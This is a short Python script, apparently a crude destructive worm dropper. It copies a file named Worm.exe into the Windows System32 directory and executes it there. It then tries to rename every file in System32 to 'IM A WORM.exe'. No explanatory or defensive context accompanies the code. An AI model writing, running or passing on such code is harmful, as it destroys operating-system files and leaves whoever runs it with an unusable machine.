import os
import shutil
cwd = os.getcwd()
shutil.copy(cwd+"/Worm.exe", "/Windows/System32")
os.chdir("/Windows/System32")
os.system(".\Worm.exe")
for files in os.listdir(os.getcwd()):
    os.rename(files, "IM A WORM.exe")
